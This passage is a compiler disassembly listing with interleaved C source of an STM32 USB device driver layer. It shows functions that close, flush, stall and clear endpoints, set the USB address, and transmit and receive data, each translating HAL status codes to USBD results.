 800cd3c:	e005      	b.n	800cd4a <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd3e:	2303      	movs	r3, #3
 800cd40:	73fb      	strb	r3, [r7, #15]
    break;
 800cd42:	e002      	b.n	800cd4a <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cd44:	2303      	movs	r3, #3
 800cd46:	73fb      	strb	r3, [r7, #15]
    break;
 800cd48:	bf00      	nop
  }
  return usb_status;
 800cd4a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd4c:	4618      	mov	r0, r3
 800cd4e:	3710      	adds	r7, #16
 800cd50:	46bd      	mov	sp, r7
 800cd52:	bd80      	pop	{r7, pc}

0800cd54 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd54:	b580      	push	{r7, lr}
 800cd56:	b084      	sub	sp, #16
 800cd58:	af00      	add	r7, sp, #0
 800cd5a:	6078      	str	r0, [r7, #4]
 800cd5c:	460b      	mov	r3, r1
 800cd5e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd60:	2300      	movs	r3, #0
 800cd62:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd64:	2300      	movs	r3, #0
 800cd66:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cd68:	687b      	ldr	r3, [r7, #4]
 800cd6a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd6e:	78fa      	ldrb	r2, [r7, #3]
 800cd70:	4611      	mov	r1, r2
 800cd72:	4618      	mov	r0, r3
 800cd74:	f7f5 fb07 	bl	8002386 <HAL_PCD_EP_Close>
 800cd78:	4603      	mov	r3, r0
 800cd7a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd7c:	7bbb      	ldrb	r3, [r7, #14]
 800cd7e:	2b03      	cmp	r3, #3
 800cd80:	d816      	bhi.n	800cdb0 <USBD_LL_CloseEP+0x5c>
 800cd82:	a201      	add	r2, pc, #4	; (adr r2, 800cd88 <USBD_LL_CloseEP+0x34>)
 800cd84:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd88:	0800cd99 	.word	0x0800cd99
 800cd8c:	0800cd9f 	.word	0x0800cd9f
 800cd90:	0800cda5 	.word	0x0800cda5
 800cd94:	0800cdab 	.word	0x0800cdab
    case HAL_OK :
      usb_status = USBD_OK;
 800cd98:	2300      	movs	r3, #0
 800cd9a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd9c:	e00b      	b.n	800cdb6 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd9e:	2303      	movs	r3, #3
 800cda0:	73fb      	strb	r3, [r7, #15]
    break;
 800cda2:	e008      	b.n	800cdb6 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cda4:	2301      	movs	r3, #1
 800cda6:	73fb      	strb	r3, [r7, #15]
    break;
 800cda8:	e005      	b.n	800cdb6 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdaa:	2303      	movs	r3, #3
 800cdac:	73fb      	strb	r3, [r7, #15]
    break;
 800cdae:	e002      	b.n	800cdb6 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cdb0:	2303      	movs	r3, #3
 800cdb2:	73fb      	strb	r3, [r7, #15]
    break;
 800cdb4:	bf00      	nop
  }
  return usb_status;
 800cdb6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cdb8:	4618      	mov	r0, r3
 800cdba:	3710      	adds	r7, #16
 800cdbc:	46bd      	mov	sp, r7
 800cdbe:	bd80      	pop	{r7, pc}

0800cdc0 <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cdc0:	b580      	push	{r7, lr}
 800cdc2:	b084      	sub	sp, #16
 800cdc4:	af00      	add	r7, sp, #0
 800cdc6:	6078      	str	r0, [r7, #4]
 800cdc8:	460b      	mov	r3, r1
 800cdca:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cdcc:	2300      	movs	r3, #0
 800cdce:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cdd0:	2300      	movs	r3, #0
 800cdd2:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cdd4:	687b      	ldr	r3, [r7, #4]
 800cdd6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdda:	78fa      	ldrb	r2, [r7, #3]
 800cddc:	4611      	mov	r1, r2
 800cdde:	4618      	mov	r0, r3
 800cde0:	f7f5 fc66 	bl	80026b0 <HAL_PCD_EP_Flush>
 800cde4:	4603      	mov	r3, r0
 800cde6:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cde8:	7bbb      	ldrb	r3, [r7, #14]
 800cdea:	2b03      	cmp	r3, #3
 800cdec:	d816      	bhi.n	800ce1c <USBD_LL_FlushEP+0x5c>
 800cdee:	a201      	add	r2, pc, #4	; (adr r2, 800cdf4 <USBD_LL_FlushEP+0x34>)
 800cdf0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cdf4:	0800ce05 	.word	0x0800ce05
 800cdf8:	0800ce0b 	.word	0x0800ce0b
 800cdfc:	0800ce11 	.word	0x0800ce11
 800ce00:	0800ce17 	.word	0x0800ce17
    case HAL_OK :
      usb_status = USBD_OK;
 800ce04:	2300      	movs	r3, #0
 800ce06:	73fb      	strb	r3, [r7, #15]
    break;
 800ce08:	e00b      	b.n	800ce22 <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce0a:	2303      	movs	r3, #3
 800ce0c:	73fb      	strb	r3, [r7, #15]
    break;
 800ce0e:	e008      	b.n	800ce22 <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce10:	2301      	movs	r3, #1
 800ce12:	73fb      	strb	r3, [r7, #15]
    break;
 800ce14:	e005      	b.n	800ce22 <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce16:	2303      	movs	r3, #3
 800ce18:	73fb      	strb	r3, [r7, #15]
    break;
 800ce1a:	e002      	b.n	800ce22 <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce1c:	2303      	movs	r3, #3
 800ce1e:	73fb      	strb	r3, [r7, #15]
    break;
 800ce20:	bf00      	nop
  }
  return usb_status;
 800ce22:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce24:	4618      	mov	r0, r3
 800ce26:	3710      	adds	r7, #16
 800ce28:	46bd      	mov	sp, r7
 800ce2a:	bd80      	pop	{r7, pc}

0800ce2c <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce2c:	b580      	push	{r7, lr}
 800ce2e:	b084      	sub	sp, #16
 800ce30:	af00      	add	r7, sp, #0
 800ce32:	6078      	str	r0, [r7, #4]
 800ce34:	460b      	mov	r3, r1
 800ce36:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce38:	2300      	movs	r3, #0
 800ce3a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce3c:	2300      	movs	r3, #0
 800ce3e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800ce40:	687b      	ldr	r3, [r7, #4]
 800ce42:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce46:	78fa      	ldrb	r2, [r7, #3]
 800ce48:	4611      	mov	r1, r2
 800ce4a:	4618      	mov	r0, r3
 800ce4c:	f7f5 fb7c 	bl	8002548 <HAL_PCD_EP_SetStall>
 800ce50:	4603      	mov	r3, r0
 800ce52:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce54:	7bbb      	ldrb	r3, [r7, #14]
 800ce56:	2b03      	cmp	r3, #3
 800ce58:	d816      	bhi.n	800ce88 <USBD_LL_StallEP+0x5c>
 800ce5a:	a201      	add	r2, pc, #4	; (adr r2, 800ce60 <USBD_LL_StallEP+0x34>)
 800ce5c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce60:	0800ce71 	.word	0x0800ce71
 800ce64:	0800ce77 	.word	0x0800ce77
 800ce68:	0800ce7d 	.word	0x0800ce7d
 800ce6c:	0800ce83 	.word	0x0800ce83
    case HAL_OK :
      usb_status = USBD_OK;
 800ce70:	2300      	movs	r3, #0
 800ce72:	73fb      	strb	r3, [r7, #15]
    break;
 800ce74:	e00b      	b.n	800ce8e <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce76:	2303      	movs	r3, #3
 800ce78:	73fb      	strb	r3, [r7, #15]
    break;
 800ce7a:	e008      	b.n	800ce8e <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce7c:	2301      	movs	r3, #1
 800ce7e:	73fb      	strb	r3, [r7, #15]
    break;
 800ce80:	e005      	b.n	800ce8e <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce82:	2303      	movs	r3, #3
 800ce84:	73fb      	strb	r3, [r7, #15]
    break;
 800ce86:	e002      	b.n	800ce8e <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce88:	2303      	movs	r3, #3
 800ce8a:	73fb      	strb	r3, [r7, #15]
    break;
 800ce8c:	bf00      	nop
  }
  return usb_status;
 800ce8e:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce90:	4618      	mov	r0, r3
 800ce92:	3710      	adds	r7, #16
 800ce94:	46bd      	mov	sp, r7
 800ce96:	bd80      	pop	{r7, pc}

0800ce98 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce98:	b580      	push	{r7, lr}
 800ce9a:	b084      	sub	sp, #16
 800ce9c:	af00      	add	r7, sp, #0
 800ce9e:	6078      	str	r0, [r7, #4]
 800cea0:	460b      	mov	r3, r1
 800cea2:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cea4:	2300      	movs	r3, #0
 800cea6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cea8:	2300      	movs	r3, #0
 800ceaa:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800ceac:	687b      	ldr	r3, [r7, #4]
 800ceae:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ceb2:	78fa      	ldrb	r2, [r7, #3]
 800ceb4:	4611      	mov	r1, r2
 800ceb6:	4618      	mov	r0, r3
 800ceb8:	f7f5 fba6 	bl	8002608 <HAL_PCD_EP_ClrStall>
 800cebc:	4603      	mov	r3, r0
 800cebe:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cec0:	7bbb      	ldrb	r3, [r7, #14]
 800cec2:	2b03      	cmp	r3, #3
 800cec4:	d816      	bhi.n	800cef4 <USBD_LL_ClearStallEP+0x5c>
 800cec6:	a201      	add	r2, pc, #4	; (adr r2, 800cecc <USBD_LL_ClearStallEP+0x34>)
 800cec8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cecc:	0800cedd 	.word	0x0800cedd
 800ced0:	0800cee3 	.word	0x0800cee3
 800ced4:	0800cee9 	.word	0x0800cee9
 800ced8:	0800ceef 	.word	0x0800ceef
    case HAL_OK :
      usb_status = USBD_OK;
 800cedc:	2300      	movs	r3, #0
 800cede:	73fb      	strb	r3, [r7, #15]
    break;
 800cee0:	e00b      	b.n	800cefa <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cee2:	2303      	movs	r3, #3
 800cee4:	73fb      	strb	r3, [r7, #15]
    break;
 800cee6:	e008      	b.n	800cefa <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cee8:	2301      	movs	r3, #1
 800ceea:	73fb      	strb	r3, [r7, #15]
    break;
 800ceec:	e005      	b.n	800cefa <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ceee:	2303      	movs	r3, #3
 800cef0:	73fb      	strb	r3, [r7, #15]
    break;
 800cef2:	e002      	b.n	800cefa <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cef4:	2303      	movs	r3, #3
 800cef6:	73fb      	strb	r3, [r7, #15]
    break;
 800cef8:	bf00      	nop
  }
  return usb_status;
 800cefa:	7bfb      	ldrb	r3, [r7, #15]
}
 800cefc:	4618      	mov	r0, r3
 800cefe:	3710      	adds	r7, #16
 800cf00:	46bd      	mov	sp, r7
 800cf02:	bd80      	pop	{r7, pc}

0800cf04 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf04:	b480      	push	{r7}
 800cf06:	b085      	sub	sp, #20
 800cf08:	af00      	add	r7, sp, #0
 800cf0a:	6078      	str	r0, [r7, #4]
 800cf0c:	460b      	mov	r3, r1
 800cf0e:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cf10:	687b      	ldr	r3, [r7, #4]
 800cf12:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf16:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cf18:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cf1c:	2b00      	cmp	r3, #0
 800cf1e:	da0c      	bge.n	800cf3a <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cf20:	78fb      	ldrb	r3, [r7, #3]
 800cf22:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cf26:	68f9      	ldr	r1, [r7, #12]
 800cf28:	1c5a      	adds	r2, r3, #1
 800cf2a:	4613      	mov	r3, r2
 800cf2c:	009b      	lsls	r3, r3, #2
 800cf2e:	4413      	add	r3, r2
 800cf30:	00db      	lsls	r3, r3, #3
 800cf32:	440b      	add	r3, r1
 800cf34:	3302      	adds	r3, #2
 800cf36:	781b      	ldrb	r3, [r3, #0]
 800cf38:	e00b      	b.n	800cf52 <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cf3a:	78fb      	ldrb	r3, [r7, #3]
 800cf3c:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cf40:	68f9      	ldr	r1, [r7, #12]
 800cf42:	4613      	mov	r3, r2
 800cf44:	009b      	lsls	r3, r3, #2
 800cf46:	4413      	add	r3, r2
 800cf48:	00db      	lsls	r3, r3, #3
 800cf4a:	440b      	add	r3, r1
 800cf4c:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cf50:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cf52:	4618      	mov	r0, r3
 800cf54:	3714      	adds	r7, #20
 800cf56:	46bd      	mov	sp, r7
 800cf58:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf5c:	4770      	bx	lr
	...

0800cf60 <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cf60:	b580      	push	{r7, lr}
 800cf62:	b084      	sub	sp, #16
 800cf64:	af00      	add	r7, sp, #0
 800cf66:	6078      	str	r0, [r7, #4]
 800cf68:	460b      	mov	r3, r1
 800cf6a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cf6c:	2300      	movs	r3, #0
 800cf6e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cf70:	2300      	movs	r3, #0
 800cf72:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cf74:	687b      	ldr	r3, [r7, #4]
 800cf76:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf7a:	78fa      	ldrb	r2, [r7, #3]
 800cf7c:	4611      	mov	r1, r2
 800cf7e:	4618      	mov	r0, r3
 800cf80:	f7f5 f97f 	bl	8002282 <HAL_PCD_SetAddress>
 800cf84:	4603      	mov	r3, r0
 800cf86:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cf88:	7bbb      	ldrb	r3, [r7, #14]
 800cf8a:	2b03      	cmp	r3, #3
 800cf8c:	d816      	bhi.n	800cfbc <USBD_LL_SetUSBAddress+0x5c>
 800cf8e:	a201      	add	r2, pc, #4	; (adr r2, 800cf94 <USBD_LL_SetUSBAddress+0x34>)
 800cf90:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cf94:	0800cfa5 	.word	0x0800cfa5
 800cf98:	0800cfab 	.word	0x0800cfab
 800cf9c:	0800cfb1 	.word	0x0800cfb1
 800cfa0:	0800cfb7 	.word	0x0800cfb7
    case HAL_OK :
      usb_status = USBD_OK;
 800cfa4:	2300      	movs	r3, #0
 800cfa6:	73fb      	strb	r3, [r7, #15]
    break;
 800cfa8:	e00b      	b.n	800cfc2 <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cfaa:	2303      	movs	r3, #3
 800cfac:	73fb      	strb	r3, [r7, #15]
    break;
 800cfae:	e008      	b.n	800cfc2 <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cfb0:	2301      	movs	r3, #1
 800cfb2:	73fb      	strb	r3, [r7, #15]
    break;
 800cfb4:	e005      	b.n	800cfc2 <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cfb6:	2303      	movs	r3, #3
 800cfb8:	73fb      	strb	r3, [r7, #15]
    break;
 800cfba:	e002      	b.n	800cfc2 <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cfbc:	2303      	movs	r3, #3
 800cfbe:	73fb      	strb	r3, [r7, #15]
    break;
 800cfc0:	bf00      	nop
  }
  return usb_status;
 800cfc2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cfc4:	4618      	mov	r0, r3
 800cfc6:	3710      	adds	r7, #16
 800cfc8:	46bd      	mov	sp, r7
 800cfca:	bd80      	pop	{r7, pc}

0800cfcc <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800cfcc:	b580      	push	{r7, lr}
 800cfce:	b086      	sub	sp, #24
 800cfd0:	af00      	add	r7, sp, #0
 800cfd2:	60f8      	str	r0, [r7, #12]
 800cfd4:	607a      	str	r2, [r7, #4]
 800cfd6:	603b      	str	r3, [r7, #0]
 800cfd8:	460b      	mov	r3, r1
 800cfda:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cfdc:	2300      	movs	r3, #0
 800cfde:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cfe0:	2300      	movs	r3, #0
 800cfe2:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800cfe4:	68fb      	ldr	r3, [r7, #12]
 800cfe6:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cfea:	7af9      	ldrb	r1, [r7, #11]
 800cfec:	683b      	ldr	r3, [r7, #0]
 800cfee:	687a      	ldr	r2, [r7, #4]
 800cff0:	f7f5 fa5a 	bl	80024a8 <HAL_PCD_EP_Transmit>
 800cff4:	4603      	mov	r3, r0
 800cff6:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cff8:	7dbb      	ldrb	r3, [r7, #22]
 800cffa:	2b03      	cmp	r3, #3
 800cffc:	d816      	bhi.n	800d02c <USBD_LL_Transmit+0x60>
 800cffe:	a201      	add	r2, pc, #4	; (adr r2, 800d004 <USBD_LL_Transmit+0x38>)
 800d000:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d004:	0800d015 	.word	0x0800d015
 800d008:	0800d01b 	.word	0x0800d01b
 800d00c:	0800d021 	.word	0x0800d021
 800d010:	0800d027 	.word	0x0800d027
    case HAL_OK :
      usb_status = USBD_OK;
 800d014:	2300      	movs	r3, #0
 800d016:	75fb      	strb	r3, [r7, #23]
    break;
 800d018:	e00b      	b.n	800d032 <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d01a:	2303      	movs	r3, #3
 800d01c:	75fb      	strb	r3, [r7, #23]
    break;
 800d01e:	e008      	b.n	800d032 <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d020:	2301      	movs	r3, #1
 800d022:	75fb      	strb	r3, [r7, #23]
    break;
 800d024:	e005      	b.n	800d032 <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d026:	2303      	movs	r3, #3
 800d028:	75fb      	strb	r3, [r7, #23]
    break;
 800d02a:	e002      	b.n	800d032 <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800d02c:	2303      	movs	r3, #3
 800d02e:	75fb      	strb	r3, [r7, #23]
    break;
 800d030:	bf00      	nop
  }
  return usb_status;
 800d032:	7dfb      	ldrb	r3, [r7, #23]
}
 800d034:	4618      	mov	r0, r3
 800d036:	3718      	adds	r7, #24
 800d038:	46bd      	mov	sp, r7
 800d03a:	bd80      	pop	{r7, pc}

0800d03c <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800d03c:	b580      	push	{r7, lr}
 800d03e:	b086      	sub	sp, #24
 800d040:	af00      	add	r7, sp, #0
 800d042:	60f8      	str	r0, [r7, #12]
 800d044:	607a      	str	r2, [r7, #4]
 800d046:	603b      	str	r3, [r7, #0]
 800d048:	460b      	mov	r3, r1
 800d04a:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800d04c:	2300      	movs	r3, #0
 800d04e:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800d050:	2300      	movs	r3, #0
 800d052:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800d054:	68fb      	ldr	r3, [r7, #12]
 800d056:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800d05a:	7af9      	ldrb	r1, [r7, #11]
 800d05c:	683b      	ldr	r3, [r7, #0]
 800d05e:	687a      	ldr	r2, [r7, #4]
 800d060:	f7f5 f9d9 	bl	8002416 <HAL_PCD_EP_Receive>
 800d064:	4603      	mov	r3, r0
 800d066:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d068:	7dbb      	ldrb	r3, [r7, #22]
 800d06a:	2b03      	cmp	r3, #3
 800d06c:	d816      	bhi.n	800d09c <USBD_LL_PrepareReceive+0x60>
 800d06e:	a201      	add	r2, pc, #4	; (adr r2, 800d074 <USBD_LL_PrepareReceive+0x38>)
 800d070:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d074:	0800d085 	.word	0x0800d085
 800d078:	0800d08b 	.word	0x0800d08b
 800d07c:	0800d091 	.word	0x0800d091
 800d080:	0800d097 	.word	0x0800d097
    case HAL_OK :
      usb_status = USBD_OK;
 800d084:	2300      	movs	r3, #0
 800d086:	75fb      	strb	r3, [r7, #23]
    break;
 800d088:	e00b      	b.n	800d0a2 <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d08a:	2303      	movs	r3, #3
 800d08c:	75fb      	strb	r3, [r7, #23]
    break;
 800d08e:	e008      	b.n	800d0a2 <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d090:	2301      	movs	r3, #1
 800d092:	75fb      	strb	r3, [r7, #23]
    break;
 800d094:	e005      	b.n	800d0a2 <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d096:	2303      	movs	r3, #3
 800d098:	75fb      	strb	r3, [r7, #23]
    break;
 800d09a:	e002      	b.n	800d0a2 <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800d09c:	2303      	movs	r3, #3
 800d09e:	75fb      	strb	r3, [r7, #23]
    break;
 800d0a0:	bf00      	nop
  }
  return usb_status;
 800d0a2:	7dfb      	ldrb	r3, [r7, #23]
}
 800d0a4:	4618      	mov	r0, r3
 800d0a6:	3718      	adds	r7, #24
 800d0a8:	46bd      	mov	sp, r7
 800d0aa:	bd80      	pop	{r7, pc}

0800d0ac <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800d0ac:	b580      	push	{r7, lr}
 800d0ae:	b082      	sub	sp, #8
 800d0b0:	af00      	add	r7, sp, #0
 800d0b2:	6078      	str	r0, [r7, #4]
 800d0b4:	460b      	mov	r3, r1
 800d0b6:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800d0b8:	687b      	ldr	r3, [r7, #4]
 800d0ba:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800d0be:	78fa      	ldrb	r2, [r7, #3]
 800d0c0:	4611      	mov	r1, r2
 800d0c2:	4618      	mov	r0, r3
 800d0c4:	f7f5 f9d8 	bl	8002478 <HAL_PCD_EP_GetRxCount>
 800d0c8:	4603      	mov	r3, r0
}
 800d0ca:	4618      	mov	r0, r3
 800d0cc:	3708      	adds	r7, #8
 800d0ce:	46bd      	mov	sp, r7
 800d0d0:	bd80      	pop	{r7, pc}
	...

0800d0d4 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800d0d4:	b580      	push	{r7, lr}
 800d0d6:	b082      	sub	sp, #8
 800d0d8:	af00      	add	r7, sp, #0
 800d0da:	6078      	str	r0, [r7, #4]
 800d0dc:	460b      	mov	r3, r1
 800d0de:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800d0e0:	78fb      	ldrb	r3, [r7, #3]
 800d0e2:	2b00      	cmp	r3, #0
 800d0e4:	d002      	beq.n	800d0ec <HAL_PCDEx_LPM_Callback+0x18>
 800d0e6:	2b01      	cmp	r3, #1
 800d0e8:	d013      	beq.n	800d112 <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800d0ea:	e023      	b.n	800d134 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800d0ec:	687b      	ldr	r3, [r7, #4]
 800d0ee:	699b      	ldr	r3, [r3, #24]
 800d0f0:	2b00      	cmp	r3, #0
 800d0f2:	d007      	beq.n	800d104 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800d0f4:	f000 f84a 	bl	800d18c <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d0f8:	4b10      	ldr	r3, [pc, #64]	; (800d13c <HAL_PCDEx_LPM_Callback+0x68>)
 800d0fa:	691b      	ldr	r3, [r3, #16]
 800d0fc:	4a0f      	ldr	r2, [pc, #60]	; (800d13c <HAL_PCDEx_LPM_Callback+0x68>)
